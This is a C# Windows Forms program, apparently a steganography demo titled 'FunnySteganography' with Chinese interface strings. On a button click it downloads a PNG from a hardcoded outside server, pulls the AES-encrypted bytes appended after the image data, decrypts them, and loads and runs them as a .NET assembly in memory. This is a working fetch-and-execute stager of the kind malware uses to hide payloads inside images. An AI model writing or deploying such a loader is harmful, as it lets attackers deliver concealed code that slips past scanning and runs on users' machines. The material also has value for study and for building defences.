using System;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace FunnySteganography
{
    public partial class MainForm : Form
    {
        private const string DOWNLOAD_URL = "https://smallquilt.quilt.idv.tw:8923/MeowSTE.png";

        public MainForm()
        {
            InitializeComponent();
        }

        public void appendOutput(string data)
        {
            txtLog.Invoke(new MethodInvoker(delegate ()
            {
                string time = DateTime.Now.ToString("yyyy - MM - dd tt hh : mm : ss");
                txtLog.AppendText("[" + time + "] " + data + Environment.NewLine);
            }));
        }

        private async void btnDownload_Click(object sender, EventArgs e)
        {
            btnDownload.Enabled = false;
            appendOutput("檔案下載開始");
            try
            {
                await Task.Run(() =>
                {
                    byte[] binary;
                    appendOutput("檔案下載中");
                    using (MemoryStream download = new MemoryStream(new WebClient().DownloadData(DOWNLOAD_URL)))
                    {
                        appendOutput("下載完畢 檔案處理中");
                        int pictureSize;
                        using (MemoryStream picture = new MemoryStream())
                        {
                            Image image = Image.FromStream(download);
                            image.Save(picture, image.RawFormat);
                            pictureSize = (int)picture.Length;

                            pbImage.Invoke(new MethodInvoker(delegate ()
                            {
                                pbImage.Image = image;
                            }));
                        }

                        download.Position = pictureSize;
                        using (MemoryStream output = new MemoryStream())
                        {
                            while (download.Position != download.Length)
                            {
                                output.WriteByte((byte)download.ReadByte());
                            }
                            binary = output.ToArray();
                        }
                    }

                    appendOutput("程式執行");
                    Assembly assembly = Assembly.Load(AESCrypto.decrypt(binary, AESCrypto.AES_KEY, AESCrypto.AES_IV));
                    MethodInfo method = assembly.EntryPoint;
                    new Thread(() =>
                    {
                        object instance = assembly.CreateInstance(method.Name);
                        method.Invoke(instance, null);
                    }).Start();
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show("處理檔案時發生例外狀況 : " + ex.Message, "錯誤", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            btnDownload.Enabled = true;
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(Environment.ExitCode);
        }
    }
}